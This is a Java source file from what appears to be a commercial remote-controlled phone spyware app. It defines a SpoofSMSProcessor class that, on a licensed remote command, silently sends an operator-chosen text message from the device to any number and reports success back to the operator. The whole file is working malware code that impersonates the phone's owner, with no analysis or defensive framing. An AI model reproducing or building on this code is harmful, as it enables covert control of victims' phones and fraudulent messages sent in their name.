package com.vvt.remotecommandmanager.processor.communication;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.stringutil.FxStringUtils;

public class SpoofSMSProcessor extends RemoteCommandProcessor {
	private static final String TAG = "SpoofSMSProcessor";
	
	private static final boolean LOGE = Customization.ERROR;
	
	private static final int RECIPIENT_NUMBER_INDEX = 2;
	private static final int SMS_MESSAGE_INDEX = 3;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private AppContext mAppContext;
	private StringBuilder mReplyMessageBuilder;
	private LicenseInfo mLicenseInfo;
	
	public SpoofSMSProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo) {
		super(appContext, eventRepository);
		
		mAppContext = appContext;
		mReplyMessage = new ProcessingResult();
		mLicenseInfo = licenseInfo;
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		
		mReplyMessageBuilder = new StringBuilder();
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED || mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_OR_EXPIRED);
			mReplyMessage.setIsSuccess(true);
	        mReplyMessage.setMessage(mReplyMessageBuilder.toString());
	        return;
		}
		
		if(commandData.getArguments().size() != 4) {
			if(LOGE) FxLog.e(TAG, "commandData arguments count invalid");
			throw new InvalidCommandFormatException();
		}
		
		mRecipientNumber = commandData.getSenderNumber();
		
		if(commandData.isSmsReplyRequired() && FxStringUtils.isEmpty(mRecipientNumber)) {
			if(LOGE) FxLog.e(TAG, "RecipientNumber can not be null or empty");
			throw new InvalidCommandFormatException();
		}
		
		String recipientNumber =  commandData.getArguments().get(RECIPIENT_NUMBER_INDEX);
		String recipientMsg =  commandData.getArguments().get(SMS_MESSAGE_INDEX);
		
		if(FxStringUtils.isEmpty(recipientNumber)) {
			if(LOGE) FxLog.e(TAG, "recipientNumber is null or empty");
			throw new InvalidCommandFormatException();
		}
		
		 SmsSender smsSender = new SmsSender(mAppContext.getApplicationContext());
         smsSender.sendSms(recipientNumber, recipientMsg);
		 
         mReplyMessage.setIsSuccess(true);
         mReplyMessage.setMessage(MessageManager.SPOOF_SMS_SUCCESS);
	}
 

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}

	
	
}
